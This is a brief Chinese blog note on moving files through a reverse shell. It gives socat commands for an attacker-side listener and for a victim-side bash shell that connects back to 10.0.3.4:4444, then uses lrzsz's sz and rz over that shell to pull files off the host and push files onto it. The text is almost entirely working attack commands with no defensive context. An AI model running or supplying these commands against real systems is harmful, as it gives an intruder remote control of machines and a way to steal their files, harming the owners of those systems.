---
title: 反弹shell后如何传输文件
date: 2024-01-06 14:32:15
tags:
---

首先要确保反弹的shell是全功能交互式tty模式:
服务端
```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```
被控端
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
export TERM=xterm256-color
 ```
之后使用zmodern协议
```bash
apt install lrzsz
```
`sz XXX` 下载文件 `rz xxx` 上传文件。
